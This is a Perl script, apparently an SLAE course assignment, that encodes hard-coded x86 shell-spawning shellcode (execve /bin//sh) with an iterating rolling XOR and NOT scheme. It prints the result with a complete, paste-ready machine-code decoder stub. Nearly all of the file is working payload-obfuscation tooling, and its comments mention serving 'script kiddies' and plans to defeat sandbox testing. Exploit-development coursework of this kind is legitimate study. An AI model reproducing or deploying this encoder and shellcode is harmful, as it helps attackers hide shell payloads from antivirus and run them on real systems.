# Author: John Stigerwalt
# SLAE: Assignment #4
# Website: slae.whiteknightlabs.com
# Program: Iterating Rolling XOR NOT Encoder (Rolling XOR and NOT Encoder with iteration and changing key each iteration) 
# Iteration does NOT add byes to shellcode 	Example: (Original Shellcode = 26 byes, After 50 iterations shellcode still equals 26 bytes) 
#
# How To Use: 
# Change $iteration to how ever many loops you want (0 && 1) equals 1 iteration
# Set Key to whatever you want, shellcode should not contain same key that is used to xor encode.
# Program has no error checking for bad chars, will need to add some at one point in time
# To decode: shellcode needs to start at last iteration key and subtract by 1
# Check out my decoder stub on how to do this.

# Future Plans: 
# Add decoder stub to script - simple copy and paste, script kiddies = heart - Complete
# Add Iteration + Key User Interation Question [ARGS]
# Add encoding scheme to defeat sandbox testing <- lol


$code = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80";
$key = "0xe4"; # starting key, will be used for first iteration or if iteration == 0 or 1
$iteration = 2;
$it_count = $iteration -1;
$firstkey;

$firstkey = hex $key;

$hexlen = length($code);
$display_len = length($code);

for ($i=0;$i<$hexlen;$i++) {
	
	 $encoded = unpack("H*", substr($code,$i,1));
	 #$tmp = "0x" . $encoded;
	 $encoded = hex $encoded;
	 push @org, $encoded;
	 #print $encoded."\n";
}

# Setup Array for XOR
@stub;
@shell;
@out;
push @out, $firstkey;	# push 0xe4 to array. - first byte of xor process
print "------------------------------------\n";
print "First Iteration Key: $key\n";

foreach $x (@org) {
	
	#$y = hex $x;
	
	$a = $x ^ $out[$#out];
	$ac = ~ $a;
	$bc = ($ac & 0xff);
	#print $bc."\n";
	
	push @out, $bc;
	
	$z = sprintf("%x", $bc);
	$fx = "0x" . $z . ",";
	push @shell, $fx;
	
} 

if ($iteration == 0 || $iteration == 1) {
	print "\nIteration == $iteration, Printing Shellcode encoded with key: $key\n\n";
	print @shell;
	print"\n\n";
	exit(1);
}

$avc = $firstkey + 1;

if (!$iteration == 0 || !$iteration == 1) {
#unless ($iteration == 0) {
	
	$iteration -= 1;	# subtract 1 from iteration. - iteration already compelted using "foreach @org" loop above

	while ($iteration > 0) {
	
		#print "While Loop: Iteration Loop: $iteration\n";
		
		$out[0] = $avc;
		#print "\nIndex out[0]: ".$out[0]. "\n";
		#$iteration_key = sprintf("%x", $avc);
		#print "\nKey: 0x".$iteration_key."\n";

		#for my $index (0 .. $#out) {
		for $index (0 .. $hexlen-1) {
			
			$a = $out[$index] ^ $out[$index+1];
			$ac = ~ $a;
			$bc = ($ac & 0xff);
			#print $bc."\n";
			
			$out[$index+1] = $bc;
			
			$z = sprintf("%x", $bc);
			$fx = "0x" . $z . ",";
			$fo = "\\x" . $z;
			#push @shell, $fx;
			#print "$fx\n";			
			
			$shell[$index] = $fx;
			$stub[$index] = $fo;
		}
		

		$avc = $avc + 1;
		$iteration--;
	
	} #End of While loop
	
} else {
	
	print "\nIteration's set to 0\n";
	
}# End of IF Loop

$iteration_key = sprintf("%x", $avc -1);
print "Decoder Stub Key:    0x".$iteration_key;
print "\nSubtract ";
print $it_count;
print " From 0x".$iteration_key." In Decoder Stub To Decode";;
print"\n------------------------------------\n\n";

print "Encoded Shellcode: ";
print"\n------------------------------------\n";
print @shell;
print"\n------------------------------------\n";
print "\n\n";

# Decoder Stub

if ($it_count <= 9) {
	$it_count = "0".$it_count;
} else {
	$it_count = sprintf("%x", $it_count);
}

if ($hexlen <= 9) {
	$hexlen = "0".$hexlen;
} else {
	$hexlen = sprintf("%x", $hexlen);
}

print "------------------------------------\n";
print "Shellcode Length: 	$display_len \n";
print "Shellcode Length Hex: 	0x$hexlen\n";
print "------------------------------------\n\n\n";

print "Shellcode with decoder stub: \n";
print "------------------------------------\n";
print "\""."\\x31\\xc0\\x99\\x31\\xff\\x6a\\x".$it_count."\\x5f\\xb4\\x".$iteration_key."\\x88\\xe0\\xeb";
print "\\x26\\x5e\\x56\\x31\\xdb\\x31\\xc9\\xb1\\x".$hexlen."\\x8a\\x1e\\x30\\xd8\\xf6\\xd0\\x88\\x06\\x88\\xd8";
print "\\x46\\xfe\\xc9\\x38\\xd1\\x75";
print "\\xef\\x88\\xe0\\x2c\\x01\\x39\\xd7\\x75\\x02\\xeb\\x08\\x4f\\xeb\\xd8\\xe8\\xd5\\xff\\xff\\xff";
print @stub;
print "\""."\n";
print "------------------------------------\n\n\n";
exit(1);
